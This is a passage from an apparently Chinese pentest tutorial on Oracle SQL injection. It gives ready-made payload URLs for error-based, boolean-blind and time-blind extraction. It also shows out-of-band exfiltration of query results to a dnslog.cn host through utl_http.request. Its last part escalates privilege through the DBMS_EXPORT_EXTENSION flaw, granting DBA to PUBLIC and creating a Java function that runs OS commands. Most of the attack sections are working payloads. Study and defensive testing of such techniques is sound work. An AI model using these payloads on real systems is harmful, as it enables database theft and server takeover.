1=ctxsys.drithsx.sn(1,&#x27;~&#x27;%7c%7c(select username from test.users where rownum=1)%7c%7c&#x27;~&#x27;) --+</span><br></pre></td></tr></table></figure>
<h3 id="dbms-xdb-version-checkin-函数报错注入"><a href="#dbms-xdb-version-checkin-函数报错注入" class="headerlink" title="dbms_xdb_version.checkin()函数报错注入"></a>dbms_xdb_version.checkin()函数报错注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.checkin(&#x27;~&#x27;%7c%7c(select user from dual)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.checkin(&#x27;~&#x27;%7c%7c(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取字段名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.checkin(&#x27;~&#x27;%7c%7c(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取数据</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.checkin(&#x27;~&#x27;%7c%7c(select username from test.users where rownum=1)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br></pre></td></tr></table></figure>
<h3 id="dbms-xdb-version-makeversioned-函数报错注入"><a href="#dbms-xdb-version-makeversioned-函数报错注入" class="headerlink" title="dbms_xdb_version.makeversioned()函数报错注入"></a>dbms_xdb_version.makeversioned()函数报错注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.makeversioned(&#x27;~&#x27;%7c%7c(select user from dual)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.makeversioned(&#x27;~&#x27;%7c%7c(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取字段名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.makeversioned(&#x27;~&#x27;%7c%7c(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取数据</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.makeversioned(&#x27;~&#x27;%7c%7c(select username from test.users where rownum=1)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br></pre></td></tr></table></figure>
<h3 id="dbms-xdb-version-uncheckout-函数报错注入"><a href="#dbms-xdb-version-uncheckout-函数报错注入" class="headerlink" title="dbms_xdb_version.uncheckout()函数报错注入"></a>dbms_xdb_version.uncheckout()函数报错注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.uncheckout(&#x27;~&#x27;%7c%7c(select user from dual)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.uncheckout(&#x27;~&#x27;%7c%7c(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取字段名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.uncheckout(&#x27;~&#x27;%7c%7c(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取数据</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.uncheckout(&#x27;~&#x27;%7c%7c(select username from test.users where rownum=1)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br></pre></td></tr></table></figure>
<h3 id="dbms-utility-sqlid-to-sqlhash-函数报错注入"><a href="#dbms-utility-sqlid-to-sqlhash-函数报错注入" class="headerlink" title="dbms_utility.sqlid_to_sqlhash()函数报错注入"></a>dbms_utility.sqlid_to_sqlhash()函数报错注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_utility.sqlid_to_sqlhash(&#x27;~&#x27;%7c%7c(select user from dual)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_utility.sqlid_to_sqlhash(&#x27;~&#x27;%7c%7c(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取字段名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_utility.sqlid_to_sqlhash(&#x27;~&#x27;%7c%7c(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取数据</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_utility.sqlid_to_sqlhash(&#x27;~&#x27;%7c%7c(select username from test.users where rownum=1)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br></pre></td></tr></table></figure>
<h3 id="ordsys-ord-dicom-getmappingxpath-函数报错注入"><a href="#ordsys-ord-dicom-getmappingxpath-函数报错注入" class="headerlink" title="ordsys.ord_dicom.getmappingxpath()函数报错注入"></a>ordsys.ord_dicom.getmappingxpath()函数报错注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select ordsys.ord_dicom.getmappingxpath(&#x27;~&#x27;%7c%7c(select user from dual)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select ordsys.ord_dicom.getmappingxpath(&#x27;~&#x27;%7c%7c(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取字段名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select ordsys.ord_dicom.getmappingxpath(&#x27;~&#x27;%7c%7c(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取数据</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select ordsys.ord_dicom.getmappingxpath(&#x27;~&#x27;%7c%7c(select username from test.users where rownum=1)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br></pre></td></tr></table></figure>
<h3 id="XMLType-函数报错注入"><a href="#XMLType-函数报错注入" class="headerlink" title="XMLType()函数报错注入"></a>XMLType()函数报错注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select upper(XMLType(chr(60)%7c%7cchr(58)%7c%7c(select user from dual)%7c%7cchr(62))) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select upper(XMLType(chr(60)%7c%7cchr(58)%7c%7c(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;)%7c%7cchr(62))) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取字段名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select upper(XMLType(chr(60)%7c%7cchr(58)%7c%7c(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1)%7c%7cchr(62))) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取数据</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select upper(XMLType(chr(60)%7c%7cchr(58)%7c%7c(select username from test.users where rownum=1)%7c%7cchr(62))) from dual) is not null --+</span><br></pre></td></tr></table></figure>
<h2 id="布尔型盲注"><a href="#布尔型盲注" class="headerlink" title="布尔型盲注"></a>布尔型盲注</h2><h3 id="decode-函数布尔盲注"><a href="#decode-函数布尔盲注" class="headerlink" title="decode()函数布尔盲注"></a>decode()函数布尔盲注</h3><p><code>decode(字段或字段的运算，值1，值2，值3）</code></p>
<p>这个函数运行的结果是，当字段或字段的运算的值等于值1时，该函数返回值2，否则返回3。</p>
<p>当然值1，值2，值3也可以是表达式，这个函数使得某些sql语句简单了许多。</p>
<p>使用方法：</p>
<p>比较大小</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select decode(sign(变量1-变量2),-1,变量1,变量2) from dual; --取较小值</span><br></pre></td></tr></table></figure>
<p>sign()函数根据某个值是0、正数还是负数，分别返回0、1、-1</p>
<p>例如：</p>
<p>变量1=10，变量2=20，则<code>sign(变量1-变量2)</code>返回-1，decode解码结果为“变量1”，达到了取较小值的目的。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> decode(sign(<span class="number">10</span><span class="number">-20</span>),<span class="number">-1</span>,<span class="number">10</span>,<span class="number">20</span>) <span class="keyword">from</span> dual;                   </span><br></pre></td></tr></table></figure>
<p><strong>猜解当前用户</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">判断是否是TEST用户</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=(select decode(user,&#x27;TEST&#x27;,1,0) from dual) --+</span><br><span class="line"></span><br><span class="line">也可利用substr()函数进行逐一猜解</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=(select decode(substr((select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;),1,1),&#x27;T&#x27;,1,0) from dual) --+</span><br></pre></td></tr></table></figure>
<p><strong>猜解表名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=(select decode(substr((select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;),1,1),&#x27;N&#x27;,1,0) from dual) --+</span><br></pre></td></tr></table></figure>
<p><strong>猜解字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=(select decode(substr((select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1),1,1),&#x27;I&#x27;,1,0) from dual) --+</span><br></pre></td></tr></table></figure>
<p><strong>猜解数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=(select decode(substr((select username from test.users where rownum=1),1,1),&#x27;a&#x27;,1,0) from dual) --+</span><br></pre></td></tr></table></figure>
<h3 id="instr-函数布尔盲注"><a href="#instr-函数布尔盲注" class="headerlink" title="instr()函数布尔盲注"></a>instr()函数布尔盲注</h3><p>instr函数的使用，从一个字符串中查找指定子串的位置。例如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> instr(<span class="string">&#x27;abcdef123de&#x27;</span>,<span class="string">&#x27;de&#x27;</span>) position <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061056394.png" alt="043da52fbdd3d786b78a7384caa9c6c7.png"></p>
<p>从1开始算 de排第四所以返回4</p>
<p><strong>布尔盲注中的应用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and (instr((select user from dual),&#x27;S&#x27;))=1 --+</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (instr((select user from dual),&#x27;SY&#x27;))=1 --+</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (instr((select user from dual),&#x27;SYS&#x27;))=1 --+</span><br></pre></td></tr></table></figure>
<p>payload构造如上。</p>
<h3 id="substr-函数布尔盲注"><a href="#substr-函数布尔盲注" class="headerlink" title="substr()函数布尔盲注"></a>substr()函数布尔盲注</h3><p><strong>获取数据长度</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select length(user) from dual)=3 --+</span><br></pre></td></tr></table></figure>
<p><strong>猜解ASCII码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select ascii(substr(user,1,1))from dual)&gt;65 --+</span><br></pre></td></tr></table></figure>
<p>payload构造如上。</p>
<h2 id="时间型盲注"><a href="#时间型盲注" class="headerlink" title="时间型盲注"></a>时间型盲注</h2><p>oracle注入中可以通过页面响应的状态，这里指的是响应时间，通过这种方式判断SQL是否被执行的方式，便是时间盲注。</p>
<p>oracle的时间盲注通常使用<code>DBMS_PIPE.RECEIVE_MESSAGE()</code>，而另外一种便是<code>decode()</code>与高耗时SQL操作的组合，当然也可以是case，if 等方式与高耗时操作的组合，这里的高耗时操作指的是，例如：<code>(select count(*) from all_objects)</code>，对数据库中大量数据进行查询或其他处理的操作，这样的操作会耗费较多的时间，然后通过这个方式来获取数据。这种方式也适用于其他数据库。</p>
<h3 id="dbms-pipe-receive-message-函数时间盲注"><a href="#dbms-pipe-receive-message-函数时间盲注" class="headerlink" title="dbms_pipe.receive_message()函数时间盲注"></a>dbms_pipe.receive_message()函数时间盲注</h3><p><code>DBMS_LOCK.SLEEP()</code>函数可以让一个过程休眠很多秒，但使用该函数存在许多限制。</p>
<p>首先，不能直接将该函数注入子查询中，因为Oracle不支持堆叠查询(stacked query)。其次，只有数据库管理员才能使用<code>DBMS_LOCK</code>包。</p>
<p>在Oracle PL/SQL中有一种更好的办法，可以使用下面的指令以内联方式注入延迟：</p>
<p><code>dbms_pipe.receive_message(&#39;RDS&#39;, 10)</code></p>
<p><code>DBMS_PIPE.RECEIVE_MESSAGE()</code>函数将为从RDS管道返回的数据等待10秒。默认情况下，允许以<code>public</code>权限执行该包。<code>DBMS_LOCK.SLEEP()</code>与之相反，它是一个可以用在SQL语句中的函数。</p>
<p><strong>查看是否可以使用dbms_pipe.receive_message()函数进行延时注入</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=(dbms_pipe.receive_message(&#x27;RDS&#x27;,5)) --+</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061056362.png" alt="c73218c0384317c32b1796c080b43cad.png"></p>
<p>来自官网的DBMS_PIPE.RECEIVE_MESSAGE语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DBMS_PIPE.RECEIVE_MESSAGE (</span><br><span class="line">   pipename     IN VARCHAR2,</span><br><span class="line">   timeout      IN INTEGER      DEFAULT maxwait)</span><br><span class="line">RETURN INTEGER;</span><br></pre></td></tr></table></figure>
<p><strong>具体payload构造：</strong></p>
<p><strong>猜解当前用户</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and 7238=(case when (ascii(substrc((select nvl(cast(user as varchar(4000)),chr(32)) from dual),1,1)) &gt; 65) then dbms_pipe.receive_message(chr(32)%7c%7cchr(106)%7c%7cchr(72)%7c%7cchr(73),5) else 7238 end) --+</span><br></pre></td></tr></table></figure>
<p><strong>猜解表名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and 7238=(case when (ascii(substrc((select nvl(cast(table_name as varchar(4000)),chr(32)) from all_tables where rownum=1 and owner=&#x27;TEST&#x27;),1,1)) &gt; 65) then dbms_pipe.receive_message(chr(32)%7c%7cchr(106)%7c%7cchr(72)%7c%7cchr(73),5) else 7238 end) --+</span><br></pre></td></tr></table></figure>
<p><strong>猜解字段</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and 7238=(case when (ascii(substrc((select nvl(cast(column_name as varchar(4000)),chr(32)) from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1),1,1)) &gt; 65) then dbms_pipe.receive_message(chr(32)%7c%7cchr(106)%7c%7cchr(72)%7c%7cchr(73),5) else 7238 end) --+</span><br></pre></td></tr></table></figure>
<p><strong>猜解数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and 7238=(case when (ascii(substrc((select nvl(cast(username as varchar(4000)),chr(32)) from test.users where rownum=1),1,1)) &gt; 65) then dbms_pipe.receive_message(chr(32)%7c%7cchr(106)%7c%7cchr(72)%7c%7cchr(73),5) else 7238 end) --+</span><br></pre></td></tr></table></figure>
<h3 id="decode-函数时间盲注"><a href="#decode-函数时间盲注" class="headerlink" title="decode()函数时间盲注"></a>decode()函数时间盲注</h3><p><code>（select count(*) from all_objects)</code>会花费更多时间去查询所有数据库的条目。不过在使用的过程中有很多不尽如人意的地方，有时候加载快有时加载慢。</p>
<p><strong>时间盲注的应用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,(select count(*) from all_objects),0) from dual)</span><br></pre></td></tr></table></figure>
<p>payload构造如上。</p>
<h3 id="decode-与dbms-pipe-receive-message-嵌套时间盲注"><a href="#decode-与dbms-pipe-receive-message-嵌套时间盲注" class="headerlink" title="decode()与dbms_pipe.receive_message()嵌套时间盲注"></a>decode()与dbms_pipe.receive_message()嵌套时间盲注</h3><p><strong>时间盲注的应用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,dbms_pipe.receive_message(&#x27;RDS&#x27;, 5),0) from dual)</span><br></pre></td></tr></table></figure>
<p>payload构造如上。</p>
<h2 id="DNS带外通信注入"><a href="#DNS带外通信注入" class="headerlink" title="DNS带外通信注入"></a>DNS带外通信注入</h2><p>Oracle注入之带外通信和DNSLOG注入非常相似，例如和mysql中load_file()函数实现无回显注入非常相似。</p>
<p>Oracle发送HTTP和DNS请求，并将查询结果带到请求中，然后检测外网服务器的HTTP和DNS日志，从日志中获取查询结果，通过这种方式将繁琐的盲注转换成可以直接获取查询结果的方式。</p>
<p>使用第三方平台，监听访问请求，并记录请求的日志信息，然后使用<code>utl_http.request()</code>向外网主机发送http请求，请求便携带了查询的结果信息。此处可以结合SSRF进行内网探测。或许这就是Oracle的SSRF。</p>
<p>利用<code>utl.inaddr.get_host_address()</code>，将查询结果拼接到域名下，并使用DNS记录解析日志，通过这种方式获取查询结果。</p>
<h3 id="检测是否支持utl-http-request"><a href="#检测是否支持utl-http-request" class="headerlink" title="检测是否支持utl_http.request"></a>检测是否支持utl_http.request</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and exists (select count(*) from all_objects where object_name=&#x27;UTL_HTTP&#x27;) --+</span><br></pre></td></tr></table></figure>
<p>若页面返回正常，这说明支持utl_http.request</p>
<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and utl_http.request(&#x27;http://&#x27;%7c%7c(select user from dual)%7c%7c&#x27;.z9mt3s.dnslog.cn/oracle&#x27;)=1--+</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and utl_http.request(&#x27;http://&#x27;%7c%7c(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;)%7c%7c&#x27;.z9mt3s.dnslog.cn/oracle&#x27;)=1--+</span><br><span class="line"></span><br><span class="line">获取列名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and utl_http.request(&#x27;http://&#x27;%7c%7c(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1)%7c%7c&#x27;.z9mt3s.dnslog.cn/oracle&#x27;)=1--+</span><br><span class="line"></span><br><span class="line">获取数据</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and utl_http.request(&#x27;http://&#x27;%7c%7c(select username from test.users where rownum=1)%7c%7c&#x27;.z9mt3s.dnslog.cn/oracle&#x27;)=1--+</span><br></pre></td></tr></table></figure>
<h2 id="利用漏洞提权执行命令"><a href="#利用漏洞提权执行命令" class="headerlink" title="利用漏洞提权执行命令"></a>利用漏洞提权执行命令</h2><p>Oracle提权漏洞集中存在于PL/SQL编写的函数、存储过程、包、触发器中。Oracle存在提权漏洞的一个重要原因是PL/SQL定义的两种调用权限导致（定义者权限和调用者权限）。定义者权限给了低权限用户在特定时期拥有高权限的可能，这就给提权操作奠定了基础。</p>
<p>即，无论调用者权限如何，执行存储过程的结果权限永远为定义者权限，因此，如果一个较高权限的用户定义了存储过程，并赋予了低权限用户调用权限，较低权限的用户即可利用这个存储过程提权。</p>
<p>Java作为Oracle公司的主打语言，具有内置的安全性机制和高效的垃圾收集系统。Java还具有一组非常大的、丰富的标准库，从而可以更快、更低成本地开发应用程序。因此Oracle公司在它的Oracle数据库中，同样支持了使用Java来编写存储过程。</p>
<p>那么对于攻击者来说，完全可以通过这一特性，在系统上执行Java代码，从而完成提权操作。</p>
<p><strong>攻击流程</strong>：</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061057610.png" alt="859e8d3edbce11899c6415bfac2e25ee.png"></p>
<p><strong>本文测试环境均为</strong>：</p>
<blockquote>
<p>CentOS Linux release 7.2.1511 (Core)</p>
<p>Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - 64bit Production</p>
</blockquote>
<p>执行方式很多种，这边只研究Oracle10g，并且本地实测成功的</p>
<ul>
<li><code>DBMS_EXPORT_EXTENSION()</code></li>
<li><code>dbms_xmlquery.newcontext()</code></li>
<li><code>DBMS_JAVA_TEST.FUNCALL()</code></li>
</ul>
<h3 id="dbms-export-extension"><a href="#dbms-export-extension" class="headerlink" title="dbms_export_extension()"></a>dbms_export_extension()</h3><blockquote>
<ul>
<li>影响版本：Oracle 8.1.7.4, 9.2.0.1-9.2.0.7, 10.1.0.2-10.1.0.4, 10.2.0.1-10.2.0.2, XE(Fixed in CPU July 2006)</li>
<li>权限：None</li>
<li>详情：这个软件包有许多易受PL/SQL注入攻击的函数。这些函数由SYS拥有，作为SYS执行并且可由PUBLIC执行。因此，如果SQL注入处于上述任何未修补的Oracle数据库版本中，那么攻击者可以调用该函数并直接执行SYS查询。</li>
</ul>
</blockquote>
<h4 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h4><p>该请求将导致查询”GRANT DBA TO PUBLIC”以SYS身份执行。 因为这个函数允许PL / SQL缺陷（PL / SQL注入）。一旦这个请求成功执行，PUBLIC获取DBA角色，从而提升当前user的特权</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">&#x27;FOO&#x27;</span>,<span class="string">&#x27;BAR&#x27;</span>,<span class="string">&#x27;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;grant dba to public&#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="string">&#x27;SYS&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>
<h4 id="使用Java执行"><a href="#使用Java执行" class="headerlink" title="使用Java执行"></a>使用Java执行</h4><p><strong>创建Java库</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">&#x27;FOO&#x27;</span>,<span class="string">&#x27;BAR&#x27;</span>,<span class="string">&#x27;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args)&#123;try&#123;BufferedReader myReader= new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=&quot;&quot;;while ((stemp = myReader.readLine()) != null) str +=stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;public static String readFile(String filename)&#123;try&#123;BufferedReader myReader= new BufferedReader(new FileReader(filename)); String stemp,str=&quot;&quot;;while ((stemp = myReader.readLine()) != null) str +=stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="string">&#x27;SYS&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>
<p><strong>赋予Java权限</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">&#x27;FOO&#x27;</span>,<span class="string">&#x27;BAR&#x27;</span>,<span class="string">&#x27;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;begin dbms_java.grant_permission(&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;PUBLIC&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;, &#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;SYS:java.io.FilePermission&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;,&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&lt;&gt;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;, &#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;execute&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;);end;&#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="string">&#x27;SYS&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>
<p><strong>创建函数</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">&#x27;FOO&#x27;</span>,<span class="string">&#x27;BAR&#x27;</span>,<span class="string">&#x27;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;LinxUtil.runCMD(java.lang.String) return String&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;;&#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="string">&#x27;SYS&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>
<p><strong>赋予函数执行权限</strong></p>
